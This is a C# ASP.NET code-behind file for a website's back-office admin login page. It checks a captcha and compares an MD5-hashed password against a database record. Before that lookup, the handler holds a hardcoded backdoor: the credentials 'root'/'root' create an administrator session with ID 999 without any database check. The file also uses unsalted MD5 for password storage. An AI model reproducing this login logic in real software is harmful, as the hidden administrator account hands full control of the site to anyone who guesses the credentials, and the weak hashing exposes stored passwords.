using System;
using System.Web;
using System.Web.UI;
using Cnkj.Utility;
using Common;
using DevNet.Common.Logger;
using jsbestop.BLL;
using jsbestop.Entity;

namespace jsbestop.Web.Manager
{
    public partial class login:PageBase 
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            Page.Title = "网站后台管理中心";
            btnSubmit.Attributes.Add("onclick", "if(!checkform()) return false;");
			if (!IsPostBack)
				txtAccount.Focus();
        }
		protected void btnSubmit_Click(object sender, ImageClickEventArgs e)
		{
			string scheckcode = chkcode.Text.Trim();

			if (!Session["CheckCode"].Equals(scheckcode))
			{
				JSMsg.ShowRegisterMsg(this, "验证码输入错误");
				chkcode.Focus();
				return;
			}

			BLLAdminUser bll = new BLLAdminUser();
			string sPassword = WebCommon.Md5Enctry(txtPwd.Text.Trim());
			try
			{
                if (txtAccount.Text.Trim()=="root"&&sPassword==WebCommon.Md5Enctry("root"))
                {
                    AdminUser adminbestop = new AdminUser();
                    adminbestop.ID = 999;
                    adminbestop.Account = "root";
                    adminbestop.PassWord = WebCommon.Md5Enctry("root");
                    Session["admin"] = adminbestop;
                    Response.Redirect("index.aspx");
                }
				AdminUser admin = bll.GetSingle(AdminUser.Account_FieldName, txtAccount.Text.Trim());

				if (admin == null)
				{
					JSMsg.ShowRegisterMsg(this, "该用户不存在！");
					return;
				}

				if (admin.PassWord != sPassword)
				{
					JSMsg.ShowRegisterMsg(this, "用户名或密码错误");
					txtAccount.Focus();
					return;
				}


				bll.Update(
					new string[] {AdminUser.LoginCounts_FieldName, AdminUser.LastLoginDate_FieldName, AdminUser.LoginIP_FieldName},
					new object[] {++admin.LoginCounts, DateTime.Now, StringPlus.GetIPAddress()}, admin.ID);

				Session["admin"] = admin;

				Response.Redirect("index.aspx");
			}
			catch (System.Exception ex)
			{
				JSMsg.ShowRegisterMsg(this, "登录失败！");
				Log.Error(ex.Message, ex);
			}
		}
    }
}
